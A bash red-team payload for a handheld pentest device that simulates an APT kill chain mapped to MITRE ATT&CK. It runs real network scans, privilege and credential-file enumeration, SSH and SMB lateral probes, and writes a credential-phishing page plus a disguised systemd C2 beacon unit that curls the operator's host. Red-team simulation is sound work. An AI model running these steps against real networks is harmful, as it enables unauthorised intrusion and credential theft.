#!/bin/bash
# Title: APT Simulator
# Author: bad-antics
# Description: Advanced Persistent Threat simulation framework for red team exercises
# Category: nullsec/simulation

LOOT_DIR="/mmc/nullsec/apt-simulator"
mkdir -p "$LOOT_DIR"

PROMPT "APT SIMULATOR

Advanced Persistent Threat
simulation framework.

Simulates real APT TTPs:
- Initial access
- Persistence
- Lateral movement
- C2 communication
- Data exfiltration
- Defense evasion

Based on MITRE ATT&CK

Press OK to configure."

PROMPT "APT PROFILE

1. APT28 (Fancy Bear)
2. APT29 (Cozy Bear)
3. Lazarus Group
4. APT41 (Winnti)
5. Custom Kill Chain
6. Full Simulation

Select on next screen."

APT=$(NUMBER_PICKER "APT Profile (1-6):" 5)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) exit 0 ;; esac

TARGET_NET=$(TEXT_PICKER "Target network:" "$(ip route | grep -v default | head -1 | awk '{print $1}')")
C2_HOST=$(TEXT_PICKER "C2 server (this device):" "$(ip addr show wlan0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)")

TIMESTAMP=$(date +%Y%m%d_%H%M%S)
REPORT="$LOOT_DIR/apt_report_${TIMESTAMP}.md"
TIMELINE="$LOOT_DIR/apt_timeline_${TIMESTAMP}.log"

log_ttp() {
    local tactic="$1" technique="$2" detail="$3"
    echo "[$(date +%H:%M:%S)] [$tactic] $technique: $detail" >> "$TIMELINE"
}

# MITRE ATT&CK technique implementations
phase_recon() {
    log_ttp "RECON" "T1595" "Active scanning target network"
    
    # Network discovery
    nmap -sn "$TARGET_NET" -oG /tmp/apt_hosts.txt 2>/dev/null
    LIVE=$(grep -c "Up" /tmp/apt_hosts.txt 2>/dev/null)
    log_ttp "RECON" "T1046" "Port scan: $LIVE hosts discovered"
    
    # Service enumeration
    grep "Up" /tmp/apt_hosts.txt | awk '{print $2}' | head -10 | while read -r host; do
        nmap -sV --top-ports 100 -T4 "$host" -oN "/tmp/apt_svc_${host}.txt" 2>/dev/null
        log_ttp "RECON" "T1046" "Services enumerated: $host"
    done
    
    # DNS enumeration
    DOMAIN=$(grep "Up" /tmp/apt_hosts.txt | head -1 | awk '{print $3}' | tr -d '()')
    if [ -n "$DOMAIN" ]; then
        nslookup "$DOMAIN" 2>/dev/null | tee -a "$TIMELINE"
        log_ttp "RECON" "T1590" "DNS enumeration: $DOMAIN"
    fi
}

phase_initial_access() {
    log_ttp "INITIAL_ACCESS" "T1566" "Phishing simulation"
    
    # Simulate spearphishing
    mkdir -p /tmp/apt_phish
    cat > /tmp/apt_phish/payload.html << 'PHISH'
<!DOCTYPE html>
<html>
<head><title>Document Viewer</title></head>
<body style="font-family:Arial;text-align:center;padding:50px">
<h2>Secure Document Portal</h2>
<p>Please enter credentials to view document</p>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email"><br><br>
<input type="password" name="password" placeholder="Password"><br><br>
<button type="submit">View Document</button>
</form>
<p style="color:#999;font-size:11px">APT Simulation - Not a real attack</p>
</body>
</html>
PHISH
    
    log_ttp "INITIAL_ACCESS" "T1190" "Exploit public-facing application (simulated)"
    
    # Simulate drive-by
    cat > /tmp/apt_phish/driveby.html << 'DRIVE'
<script>
// Simulated browser fingerprinting (benign)
var info = {
    ua: navigator.userAgent,
    platform: navigator.platform,
    lang: navigator.language,
    screen: screen.width + "x" + screen.height,
    plugins: navigator.plugins.length
};
console.log("APT-SIM fingerprint:", JSON.stringify(info));
</script>
DRIVE
    log_ttp "INITIAL_ACCESS" "T1189" "Drive-by compromise prepared"
}

phase_execution() {
    log_ttp "EXECUTION" "T1059" "Command & scripting interpreter"
    
    # Simulate payload execution
    PAYLOAD_HASH=$(echo "apt_sim_$(date +%s)" | md5sum | cut -d' ' -f1)
    log_ttp "EXECUTION" "T1059.004" "Unix shell execution (hash: $PAYLOAD_HASH)"
    
    # Simulate scheduled task
    log_ttp "EXECUTION" "T1053" "Scheduled task creation (simulated)"
}

phase_persistence() {
    log_ttp "PERSISTENCE" "T1547" "Boot/logon autostart (simulated)"
    
    # Simulate cron persistence
    CRON_ENTRY="*/5 * * * * curl -s http://$C2_HOST:8888/beacon 2>/dev/null"
    log_ttp "PERSISTENCE" "T1053.003" "Cron job: $CRON_ENTRY (NOT installed)"
    
    # Simulate SSH authorized_keys
    log_ttp "PERSISTENCE" "T1098.004" "SSH key persistence (simulated)"
    
    # Simulate systemd service
    cat > /tmp/apt_service.txt << SVC
[Unit]
Description=System Update Service
After=network.target
[Service]
ExecStart=/bin/bash -c 'while true; do curl -s http://$C2_HOST:8888/c2; sleep 300; done'
Restart=always
[Install]
WantedBy=multi-user.target
SVC
    log_ttp "PERSISTENCE" "T1543.002" "Systemd service prepared (NOT installed)"
}

phase_privilege_escalation() {
    log_ttp "PRIV_ESC" "T1548" "Abuse elevation control"
    
    # Check SUID binaries
    find / -perm -4000 -type f 2>/dev/null | head -20 > /tmp/apt_suid.txt
    SUID_COUNT=$(wc -l < /tmp/apt_suid.txt)
    log_ttp "PRIV_ESC" "T1548.001" "Found $SUID_COUNT SUID binaries"
    
    # Check sudo permissions
    sudo -l 2>/dev/null > /tmp/apt_sudo.txt
    log_ttp "PRIV_ESC" "T1548.003" "Sudo permissions enumerated"
    
    # Check writable paths
    find /etc /usr/local -writable -type f 2>/dev/null | head -10 > /tmp/apt_writable.txt
    log_ttp "PRIV_ESC" "T1574" "Writable system paths found: $(wc -l < /tmp/apt_writable.txt)"
    
    # Kernel version (exploit check)
    KERNEL=$(uname -r)
    log_ttp "PRIV_ESC" "T1068" "Kernel: $KERNEL (exploit check)"
}

phase_defense_evasion() {
    log_ttp "DEF_EVASION" "T1070" "Indicator removal"
    
    # Simulate log clearing (don't actually clear)
    log_ttp "DEF_EVASION" "T1070.002" "Log files identified for clearing (NOT cleared)"
    
    # Simulate timestomping
    log_ttp "DEF_EVASION" "T1070.006" "Timestomping capability verified"
    
    # File masquerading
    log_ttp "DEF_EVASION" "T1036" "File masquerading: /tmp/apt_service.txt -> systemd-resolved"
    
    # Process injection simulation
    log_ttp "DEF_EVASION" "T1055" "Process injection capability (simulated)"
}

phase_credential_access() {
    log_ttp "CRED_ACCESS" "T1003" "OS credential dumping"
    
    # Check for password files
    [ -f /etc/shadow ] && log_ttp "CRED_ACCESS" "T1003.008" "/etc/shadow accessible"
    [ -f /etc/passwd ] && log_ttp "CRED_ACCESS" "T1003.008" "/etc/passwd readable"
    
    # SSH key collection
    SSH_KEYS=$(find /home -name "id_*" -o -name "*.pem" 2>/dev/null | wc -l)
    log_ttp "CRED_ACCESS" "T1552.004" "SSH keys found: $SSH_KEYS"
    
    # Browser credential stores
    BROWSER_STORES=$(find /home -path "*/.mozilla/firefox/*/logins.json" -o \
        -path "*/.config/google-chrome/*/Login Data" 2>/dev/null | wc -l)
    log_ttp "CRED_ACCESS" "T1555.003" "Browser cred stores: $BROWSER_STORES"
    
    # Config file secrets
    SECRETS=$(grep -rl "password\|secret\|api_key\|token" /home 2>/dev/null | wc -l)
    log_ttp "CRED_ACCESS" "T1552.001" "Files with credentials: $SECRETS"
}

phase_discovery() {
    log_ttp "DISCOVERY" "T1082" "System information discovery"
    
    # System info
    log_ttp "DISCOVERY" "T1082" "OS: $(uname -a)"
    log_ttp "DISCOVERY" "T1082" "CPU: $(nproc) cores"
    log_ttp "DISCOVERY" "T1082" "RAM: $(free -h | awk '/Mem/{print $2}')"
    
    # Network info
    log_ttp "DISCOVERY" "T1016" "Network: $(ip addr | grep 'inet ' | grep -v 127 | awk '{print $2}')"
    log_ttp "DISCOVERY" "T1049" "Connections: $(ss -tun | wc -l) active"
    
    # User info
    log_ttp "DISCOVERY" "T1033" "User: $(whoami) ($(id))"
    log_ttp "DISCOVERY" "T1087" "Users: $(cat /etc/passwd | grep -c '/bin/bash\|/bin/sh')"
    
    # Process list
    log_ttp "DISCOVERY" "T1057" "Processes: $(ps aux | wc -l)"
    
    # Security tools
    for tool in fail2ban ufw iptables snort suricata ossec; do
        command -v "$tool" &>/dev/null && log_ttp "DISCOVERY" "T1518.001" "Security: $tool installed"
    done
}

phase_lateral_movement() {
    log_ttp "LATERAL" "T1021" "Remote services"
    
    # SSH lateral movement
    grep "Up" /tmp/apt_hosts.txt 2>/dev/null | awk '{print $2}' | while read -r host; do
        ssh -o BatchMode=yes -o ConnectTimeout=3 "$host" "hostname" 2>/dev/null && \
            log_ttp "LATERAL" "T1021.004" "SSH access: $host (key auth)" || \
            log_ttp "LATERAL" "T1021.004" "SSH denied: $host"
    done
    
    # SMB lateral
    grep "Up" /tmp/apt_hosts.txt 2>/dev/null | awk '{print $2}' | while read -r host; do
        smbclient -L "//$host" -N -t 3 2>/dev/null && \
            log_ttp "LATERAL" "T1021.002" "SMB shares: $host (null session)"
    done
}

phase_collection() {
    log_ttp "COLLECTION" "T1005" "Data from local system"
    
    # Find sensitive files
    find /home -name "*.doc*" -o -name "*.xls*" -o -name "*.pdf" -o -name "*.pptx" \
        -o -name "*.key" -o -name "*.pem" -o -name "*.conf" -o -name ".env" \
        2>/dev/null | head -50 > /tmp/apt_sensitive.txt
    SENS_COUNT=$(wc -l < /tmp/apt_sensitive.txt)
    log_ttp "COLLECTION" "T1005" "Sensitive files: $SENS_COUNT"
    
    # Archive staging
    log_ttp "COLLECTION" "T1074" "Data staged for exfiltration (simulated)"
    log_ttp "COLLECTION" "T1560" "Archive collected data (simulated)"
}

phase_c2() {
    log_ttp "C2" "T1071" "Application layer protocol"
    
    # HTTP C2 beacon simulation
    BEACON_DATA=$(echo "{\"host\":\"$(hostname)\",\"user\":\"$(whoami)\",\"time\":\"$(date -u +%Y-%m-%dT%H:%M:%SZ)\"}" | base64)
    log_ttp "C2" "T1071.001" "HTTP beacon: $BEACON_DATA"
    
    # DNS C2 simulation
    C2_DNS=$(echo "$(hostname).$(whoami).c2.example.com")
    log_ttp "C2" "T1071.004" "DNS C2: $C2_DNS (NOT resolved)"
    
    # Encrypted channel
    log_ttp "C2" "T1573" "Encrypted C2 channel (simulated)"
}

phase_exfiltration() {
    log_ttp "EXFIL" "T1041" "Exfiltration over C2 channel"
    
    DATA_SIZE=$(du -sh /tmp/apt_sensitive.txt 2>/dev/null | awk '{print $1}')
    log_ttp "EXFIL" "T1041" "Data staged: $DATA_SIZE"
    log_ttp "EXFIL" "T1048" "Exfiltration over alternative protocol (simulated)"
    log_ttp "EXFIL" "T1567" "Exfiltration to cloud storage (simulated)"
}

generate_report() {
    cat > "$REPORT" << REPORT
# APT Simulation Report
## NullSec Red Team Exercise

**Date:** $(date -u +%Y-%m-%d)
**Time:** $(date -u +%H:%M:%S) UTC
**Operator:** $(whoami)@$(hostname)
**Target:** $TARGET_NET
**APT Profile:** $APT_NAME

---

## Executive Summary

Simulated APT campaign against target network $TARGET_NET.
$(wc -l < "$TIMELINE") techniques executed across $(grep -c "^\[" "$TIMELINE" | sort -u) MITRE ATT&CK categories.

## Kill Chain Timeline

\`\`\`
$(cat "$TIMELINE")
\`\`\`

## Findings

### Critical
$(grep -c "CRED_ACCESS\|PRIV_ESC" "$TIMELINE") credential/privilege issues found

### High
$(grep -c "LATERAL\|PERSISTENCE" "$TIMELINE") lateral movement/persistence vectors

### Medium  
$(grep -c "DEF_EVASION\|DISCOVERY" "$TIMELINE") defense evasion/discovery findings

### Low
$(grep -c "RECON\|COLLECTION" "$TIMELINE") reconnaissance/collection items

## MITRE ATT&CK Coverage

| Tactic | Techniques |
|--------|-----------|
$(for tactic in RECON INITIAL_ACCESS EXECUTION PERSISTENCE PRIV_ESC DEF_EVASION CRED_ACCESS DISCOVERY LATERAL COLLECTION C2 EXFIL; do
    COUNT=$(grep -c "$tactic" "$TIMELINE" 2>/dev/null)
    [ "$COUNT" -gt 0 ] && echo "| $tactic | $COUNT |"
done)

## Recommendations

1. Patch identified vulnerable services
2. Implement network segmentation
3. Deploy endpoint detection (EDR)
4. Enable comprehensive logging
5. Conduct security awareness training
6. Review credential storage practices

---
*Generated by NullSec APT Simulator*
*For authorized red team use only*
REPORT
}

# APT Profile configurations
case $APT in
    1) APT_NAME="APT28 (Fancy Bear)"
       PHASES="recon initial_access execution persistence credential_access lateral_movement c2 exfiltration" ;;
    2) APT_NAME="APT29 (Cozy Bear)"
       PHASES="recon initial_access execution persistence defense_evasion credential_access discovery lateral_movement collection c2 exfiltration" ;;
    3) APT_NAME="Lazarus Group"
       PHASES="recon initial_access execution persistence privilege_escalation credential_access c2 exfiltration" ;;
    4) APT_NAME="APT41 (Winnti)"
       PHASES="recon initial_access execution persistence privilege_escalation defense_evasion credential_access discovery lateral_movement collection c2 exfiltration" ;;
    5) APT_NAME="Custom Kill Chain"
       PHASES="recon initial_access execution persistence privilege_escalation defense_evasion credential_access discovery lateral_movement collection c2 exfiltration" ;;
    6) APT_NAME="Full Simulation (All Phases)"
       PHASES="recon initial_access execution persistence privilege_escalation defense_evasion credential_access discovery lateral_movement collection c2 exfiltration" ;;
esac

resp=$(CONFIRMATION_DIALOG "LAUNCH APT SIM?

Profile: $APT_NAME
Target: $TARGET_NET
C2: $C2_HOST

This is a RED TEAM exercise.
Ensure authorization first.

Press OK to begin.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

LOG "APTSimulator: profile=$APT_NAME target=$TARGET_NET"
echo "# APT Simulation Timeline - $APT_NAME" > "$TIMELINE"
echo "# Started: $(date -u +%Y-%m-%dT%H:%M:%SZ)" >> "$TIMELINE"
echo "" >> "$TIMELINE"

PHASE_NUM=0
TOTAL_PHASES=$(echo "$PHASES" | wc -w)

for phase in $PHASES; do
    PHASE_NUM=$((PHASE_NUM + 1))
    PHASE_LABEL=$(echo "$phase" | tr '_' ' ' | tr '[:lower:]' '[:upper:]')
    SPINNER_START "Phase $PHASE_NUM/$TOTAL_PHASES: $PHASE_LABEL"
    
    case "$phase" in
        recon) phase_recon ;;
        initial_access) phase_initial_access ;;
        execution) phase_execution ;;
        persistence) phase_persistence ;;
        privilege_escalation) phase_privilege_escalation ;;
        defense_evasion) phase_defense_evasion ;;
        credential_access) phase_credential_access ;;
        discovery) phase_discovery ;;
        lateral_movement) phase_lateral_movement ;;
        collection) phase_collection ;;
        c2) phase_c2 ;;
        exfiltration) phase_exfiltration ;;
    esac
    
    SPINNER_STOP
    sleep 1
done

SPINNER_START "Generating report..."
generate_report
SPINNER_STOP

TTP_COUNT=$(grep -c "T[0-9]" "$TIMELINE" 2>/dev/null)
TACTIC_COUNT=$(grep -oP '\[\K[A-Z_]+' "$TIMELINE" 2>/dev/null | sort -u | wc -l)

PROMPT "APT SIMULATION COMPLETE

Profile: $APT_NAME
Techniques: $TTP_COUNT
Tactics: $TACTIC_COUNT
Phases: $TOTAL_PHASES

Report saved to:
apt-simulator/

Press OK to exit."

NOTIFICATION "APT Sim complete: $TTP_COUNT TTPs across $TACTIC_COUNT tactics"

# Cleanup temp files
rm -f /tmp/apt_*.txt /tmp/apt_phish/* 2>/dev/null
rmdir /tmp/apt_phish 2>/dev/null
